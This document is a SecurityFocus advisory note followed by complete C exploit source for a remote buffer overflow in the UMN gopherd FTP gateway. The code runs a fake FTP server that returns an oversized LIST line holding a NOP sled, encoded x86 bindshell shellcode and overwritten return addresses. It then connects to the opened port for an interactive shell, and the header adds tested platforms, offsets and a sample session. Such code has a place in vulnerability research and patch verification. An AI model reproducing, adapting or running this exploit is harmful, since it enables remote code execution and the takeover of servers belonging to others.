source: http://www.securityfocus.com/bid/8167/info

It has been reported that the FTP gateway component within the gopherd server is prone to a buffer overflow vulnerability. This vulnerability may be present due to a failure to perform bounds checking when processing long filenames returned from the FTP LIST command. This could permit code execution in the context of the software.


/*[ UMN gopherd[2.x.x/3.x.x]: remote "ftp gateway" buffer overflow. ]*
 *                                                                   *
 * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realhalo)         *
 *                                                                   *
 * three years since last audit, code is a little more secure.  but, *
 * still found a few potentially exploitable situations.  this       *
 * exploits the "ftp gateway" feature of gopherd.  the gateway is    *
 * intended to act as a proxy of sorts.  between the server, and the *
 * client.  the bug occurs when gopherd attempts to read a ftp       *
 * list(LIST), and strcpy()'s the filename without checking the      *
 * length.  an example would look like this(including where to put   *
 * the shellcode at):                                                *
 *                                                                   *
 * "-rwxrwxrwx 1 <shellcode> root 1 Dec 31 23:59 <long string>"      *
 *                                                                   *
 * to exploit this, there needs to be a fake ftp daemon of sorts.    *
 * and, do to the nature of gopherd's "ftp gateway" support, must be *
 * on port 21.  which means this exploit needs to run as root.       *
 *                                                                   *
 * when exploiting this bug, it is made moderately easy by gopherd.  *
 * because, the buffer that holds the string is 8192 bytes, and on   *
 * the stack.  meaning the amount of NOPs used can be around ~7500.  *
 *                                                                   *
 * requirements(general):                                            *
 *  gopherd must have "ftp gateway" support included on compile,     *
 *  this is true by default.  but, the "--disable-ftp" configure     *
 *  option will make exploitation of this bug impossible.            *
 *                                                                   *
 * requirements(for this exploit):                                   *
 *  the server must be running linux/x86(what i made the exploit     *
 *  for).  gopherd must be started in the root directory "/",        *
 *  running with the -c command line option, or started as non-root. *
 *  any of those three situations will allow for successful          *
 *  exploitation.  this does not mean it is impossible to exploit    *
 *  otherwise.  but, gopherd will be in a chroot()'d state.  and, as *
 *  of the 2.4 kernel series, i have seen no such way to break       *
 *  chroot.  if it is desired to still run code, even in a limited   *
 *  environment, simply change the shellcode to your likings.  also, *
 *  the exploit must be ran as root, to bind to port 21.             *
 *                                                                   *
 * bug location(gopher-3.0.5/gopherd/ftp.c):                         *
 *  1800:int                                                         *
 *  1801:GopherFile(FTP *ftp, char *buf, char *theName)              *
 *  1802:{                                                           *
 *  ...                                                              *
 *  1805:char tmpName[256];                                          *
 *  ...                                                              *
 *  1811:strcpy(tmpName, buf);                                       *
 *                                                                   *
 * vulnerable versions:                                              *
 *  v3.0.5, v3.0.4, v3.0.3, v3.0.2, v3.0.1, v3.0.0(-1),              *
 *  v2.3.1. (patch level 0 through 15/all 2.3.1 versions)            *
 *  (it is assumed versions before 2.3.1 are vulnerable as well)     *
 *                                                                   *
 * tested on platforms(with no code changes/offsets):                *
 *  RedHat7.1, 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2001 i686           *
 *  Mandrake9.1, 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686 *
 *  (tested on both v3.0.5, and v2.3.1 sources / no changes.  this   *
 *  should apply to pretty much any generic linux, do to the amount  *
 *  of NOPs(~7500 bytes guessing room), and on the stack)            *
 *                                                                   *
 * example usage:                                                    *
 *  # cc xgopherd2k3-ftp.c -o xgopherd2k3-ftp                        *
 *  # ./xgopherd2k3-ftp localhost 127.0.0.1                          *
 *  [*] UMN gopherd[2.x.x/3.x.x]: remote buffer overflow exploit.    *
 *  [*] "UMN gopherd remote ftp gateway buffer overflow"             *
 *  [*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)             *
 *                                                                   *
 *  [*] target: localhost:70 - localhost: 127.0.0.1 - offset: 0xbff$ *
 *                                                                   *
 *  [*] starting ftp daemon. (background)                            *
 *  [*] attempting to connect: localhost:70.                         *
 *  [*] connected successfully: localhost:70.                        *
 *  [?] +GOPHERD: "ftp://x:x@127.0.0.1".                             *
 *  [*] ftp daemon connection established.                           *
 *  [?] -FTPD: "SYST".                                               *
 *  [?] -FTPD: "USER x".                                             *
 *  [?] -FTPD: "PASS x".                                             *
 *  [?] -FTPD: "PORT 127,0,0,1,128,35".                              *
 *  [?] -FTPD: "LIST -F".                                            *
 *  [?] +FTPD: "-rwxrwxrwx 1 <shellcode(7800)> root 1 Dec 31 23:59 $ *
 *  [*] waiting for ftp daemon to finish. (ctrl-c if needed)         *
 *  [*] ftp daemon connection closed.                                *
 *  [*] checking to see if the exploit was successful.               *
 *  [*] attempting to connect: localhost:45295.                      *
 *  [*] successfully connected: localhost:45295.                     *
 *                                                                   *
 *  Linux localhost.localdomain 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2$ *
 *  uid=13(gopher) gid=30(gopher) groups=0(root),1(bin),2(daemon),3$ *
 *                                                                   *
 * note: when using your "local ip", do not make it 127.0.0.1, like  *
 * in the example.  it must be the ip you connect to the internet    *
 * through. (not an local area network ip, or whatnot)               *
 *********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* change defines at will. (cept EIPSIZE, not recommended)     */
#define CODESIZE 7800 /* part of buf[8192]/stack. (~-350)      */
#define EIPSIZE 292 /* riding a fine line, don't make too big. */
#define RETADDR 0xbfffe29b /* center of NOPs for me. (~+-3500) */
#define TIMEOUT 10 /* connection timeout. (general)            */

/* globals. */
static char x86_exec[]= /* bindshell(45295)&, netric/S-poly. */
 "\x57\x5f\xeb\x11\x5e\x31\xc9\xb1\xc8\x80\x44\x0e\xff\x2b\x49"
 "\x41\x49\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x06\x95\x06\xb0"
 "\x06\x9e\x26\x86\xdb\x26\x86\xd6\x26\x86\xd7\x26\x5e\xb6\x88"
 "\xd6\x85\x3b\xa2\x55\x5e\x96\x06\x95\x06\xb0\x25\x25\x25\x3b"
 "\x3d\x85\xc4\x88\xd7\x3b\x28\x5e\xb7\x88\xe5\x28\x88\xd7\x27"
 "\x26\x5e\x9f\x5e\xb6\x85\x3b\xa2\x55\x06\xb0\x0e\x98\x49\xda"
 "\x06\x95\x15\xa2\x55\x06\x95\x25\x27\x5e\xb6\x88\xd9\x85\x3b"
 "\xa2\x55\x5e\xac\x06\x95\x06\xb0\x06\x9e\x88\xe6\x86\xd6\x85"
 "\x05\xa2\x55\x06\x95\x06\xb0\x25\x25\x2c\x5e\xb6\x88\xda\x85"
 "\x3b\xa2\x55\x5e\x9b\x06\x95\x06\xb0\x85\xd7\xa2\x55\x0e\x98"
 "\x4a\x15\x06\x95\x5e\xd0\x85\xdb\xa2\x55\x06\x95\x06\x9e\x5e"
 "\xc8\x85\x14\xa2\x55\x06\x95\x16\x85\x14\xa2\x55\x06\x95\x16"
 "\x85\x14\xa2\x55\x06\x95\x25\x3d\x04\x04\x48\x3d\x3d\x04\x37"
 "\x3e\x43\x5e\xb8\x60\x29\xf9\xdd\x25\x28\x5e\xb6\x85\xe0\xa2"
 "\x55\x06\x95\x15\xa2\x55\x06\x95\x5e\xc8\x85\xdb\xa2\x55\xc0"
 "\x6e";
char ftp_ip[64+1];
unsigned short ftp_port=0;
pid_t ftp_pid=0;
/* return address offset. (arg3) */
unsigned int offset_ra=0;

/* functions. */
char *geteip(void);
char *getcode(void);
unsigned short ftpd_read(int);
void ftpd_handler(int,char *);
void ftpd_list(char *,unsigned short);
void ftpd(void);
void gopher_connect(char *,unsigned short,char *);
void getshell(char *,unsigned short);
void printe(char *,short);

/* signal handlers. */
void sig_ctrlc_wait(){if(ftp_pid)kill(ftp_pid,9);}
void sig_ctrlc_exit(){printe("ctrl-c abort.",1);}
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* begin. */
int main(int argc,char **argv){
 unsigned short gopher_port=70; /* default. */
 unsigned int i=0;
 char *gopher_host;
 printf("[*] UMN gopherd[2.x.x/3.x.x]: remote buffer o"
 "verflow exploit.\n[*] \"UMN gopherd remote ftp gatew"
 "ay buffer overflow\"\n[*] by: vade79/v9 v9@fakehalo."
 "deadpig.org (fakehalo)\n\n");
 if(argc<3){
  printf("[!] syntax: %s <hostname[:port]> <local/your"
  "_ip> [offset]\n\n",argv[0]);
  exit(1);
 }
 if(!(gopher_host=(char *)strdup(argv[1])))
  printe("main(): allocating memory failed",1);
 for(i=0;i<strlen(gopher_host);i++)
  if(gopher_host[i]==':')
   gopher_host[i]=0x0;
 if(index(argv[1],':'))
  gopher_port=atoi((char *)index(argv[1],':')+1);
 if(!gopher_port)
  gopher_port=70;
 if(argc>3)
  offset_ra=atoi(argv[3]);
 printf("[*] target: %s:%d - localhost: %s - offset: 0x%.8x(+" 
 "%u)\n\n",gopher_host,gopher_port,argv[2],RETADDR,offset_ra); 
 signal(SIGINT,sig_ctrlc_wait);
 signal(SIGALRM,sig_alarm);
 /* start ftpd, as a different process. */
 switch(ftp_pid=fork()){
  case -1:
   printe("fork() ftpd failure.",1);
   break;
  case 0:
   signal(SIGINT,SIG_DFL);
   ftpd();
   _exit(0);
   break;
  default:
   printf("[*] starting ftp daemon. (background)\n");
   break;
 }
 gopher_connect(gopher_host,gopher_port,argv[2]);
 /* gotta let the ftpd magic happen, plenty of time. */
 printf("[*] waiting for ftp daemon to finish. (ctrl-c if"
 " needed)\n");
 waitpid(ftp_pid,0,0);
 signal(SIGINT,sig_ctrlc_exit);
 getshell(gopher_host,45295); /* defined in shellcode. */
 printf("[!] exploit failed.\n");
 exit(0);
}
char *geteip(void){
 unsigned int i=0;
 char *buf;
 if(!(buf=(char *)malloc(EIPSIZE+1)))
  printe("ftpd_read(): allocating memory failed.",1);
 memset(buf,0x0,EIPSIZE+1);
 for(i=0;i<EIPSIZE;i+=4){*(long *)&buf[i]=(RETADDR+offset_ra);}
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(CODESIZE+1)))
  printe("getcode(): allocating memory failed",1);
 memset(buf,0x90,(CODESIZE-strlen(x86_exec)));
 memcpy(buf+(CODESIZE-strlen(x86_exec)),x86_exec,
 strlen(x86_exec));
 return(buf);
}
unsigned short ftpd_read(int sock){
 char *buf;
 if(!(buf=(char *)malloc(4096+1)))
  return(1);
 memset(buf,0x0,4096+1);
 if(read(sock,buf,4096)<1)
  return(1);
 ftpd_handler(sock,buf);
 return(0);
}
void ftpd_handler(int sock,char *buf){
 unsigned int addr1,addr2,addr3,addr4,port1,port2,i;
 /* clean up for display, changes nothing critical. */
 for(i=0;i<strlen(buf);i++)
  if(buf[i]=='\r'||buf[i]=='\n')
   buf[i]=0x0;
 if(strlen(buf)){
  printf("[?] -FTPD: \"%s\".\n",buf);
  if(!strncmp("SYST",buf,4))
   dprintf(sock,"215 UNIX Type: L8\n");
  else if(!strncmp("USER ",buf,5))
   dprintf(sock,"331 login ok.\n");
  else if(!strncmp("PASS ",buf,5))
   dprintf(sock,"230 access granted.\n");
  else if(!strncmp("PORT ",buf,5)){
   sscanf(buf,"PORT %u,%u,%u,%u,%u,%u",&addr1,&addr2,&addr3,
   &addr4,&port1,&port2);
   memset(ftp_ip,0x0,64+1);
   snprintf(ftp_ip,64,"%u.%u.%u.%u",addr1,addr2,addr3,addr4); 
   ftp_port=((port1*256)+port2);                                                 
   dprintf(sock,"200 PORT command successful.\n");
  }
  else if(!strncmp("LIST",buf,4)){
   dprintf(sock,"150 Opening connection.\n");
   /* send the fake file list, the exploit itself. */
   if(strlen(ftp_ip)&&ftp_port)
    ftpd_list(ftp_ip,ftp_port);
   dprintf(sock,"226 Transfer complete.\n");
   sleep(1);
   /* nothing else of importance. */
   close(sock);
  }
 }
 return;
}
void ftpd_list(char *ip,unsigned short port){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(ip))){
  if(!(t=gethostbyname(ip)))
   printe("couldn't resolve ftp_list hostname/ip.",1);
  memcpy((char*)&s.sin_addr,(char*)t->h_addr,
  sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("ftpd_list connection failed.",1);
 alarm(0);
 /* the exploit itself, what changes the EIP.     */
 /* i just put the shellcode where the user/owner */
 /* of the file would normally go, goes into the  */
 /* fat buf[8192] buffer, yummy.                  */
 printf("[?] +FTPD: \"-rwxrwxrwx 1 <shellcode(%u)> root "
 "1 Dec 31 23:59 <eip(%u)>\".\n",CODESIZE,EIPSIZE);
 dprintf(sock,"-rwxrwxrwx 1 %s root 1 Dec 31 23:59 %s\n",
 getcode(),geteip());
 sleep(1); /* not needed, safe call. */
 close(sock);
 return;
}
void ftpd(void){
 int ssock,sock,salen,so=1,i=0;
 struct sockaddr_in ssa,sa;
 ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 /* just incase used multiple times, good habit anyways. */
 setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so));
 /* not everywheres. */
#ifdef SO_REUSEPORT
 setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so));
#endif
 ssa.sin_family=AF_INET;
 /* must be default, gopherd limitations. :( */
 ssa.sin_port=htons(21);
 ssa.sin_addr.s_addr=INADDR_ANY;   
 if(bind(ssock,(struct sockaddr *)&ssa,sizeof(ssa))==-1)
  printe("could not bind socket, ftpd already running?",1);
 listen(ssock,1);
 bzero((char*)&sa,sizeof(struct sockaddr_in));
 /* some things i just don't see the reason for. :/ */                           
 salen=sizeof(sa);
 sock=accept(ssock,(struct sockaddr *)&sa,&salen);
 close(ssock); /* close server socket. */
 printf("[*] ftp daemon connection established.\n");
 /* welcome! */
 dprintf(sock,"220 FakeFTPD.\n");
 while(!i)
  i=ftpd_read(sock);
 close(sock);
 printf("[*] ftp daemon connection closed.\n");
 return;
}
void gopher_connect(char *hostname,unsigned short port,
char *myip){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   printe("couldn't resolve gopher hostname.",1);
  memcpy((char*)&s.sin_addr,(char*)t->h_addr,
  sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("gopher connection failed.",1);
 alarm(0);
 printf("[*] connected successfully: %s:%d.\n",hostname,port);
 printf("[?] +GOPHERD: \"ftp://x:x@%s\".\n",myip);
 sleep(1); /* had problems, without a delay here. */
 dprintf(sock,"ftp://x:x@%s\n",myip);
 sleep(1); /* doesn't really matter, but to be safe. :/ */
 /* leave gopher socket open, for the duration. */
 return;
}
/* same getshell() routine as usual. */
void getshell(char *hostname,unsigned short port){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 printf("[*] checking to see if the exploit was successful.\n");
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1){
  printe("getshell(): socket() failed",0);
  return;
 }
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname))){
   printe("getshell(): couldn't resolve",0);
   return;
  }
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf("[*] attempting to connect: %s:%d.\n",
 hostname,port);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",
  hostname,port);
  return;
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",
 hostname,port);
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1){
   printe("getshell(): select() failed",0);
   return;
  }
  if(FD_ISSET(0,&fds)){ 
   if((r=read(0,buf,4096))<1){
    printe("getshell(): read() failed",0);
    return;
   }
   if(write(sock,buf,r)!=r){
    printe("getshell(): write() failed",0);
    return;
   }
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)
    exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e){
  /* don't want to exit with ftpd still running. */
  if(ftp_pid)
   kill(ftp_pid,9);
  printf("[!] exploit failed.\n");
  exit(1);
 }
 return;
}
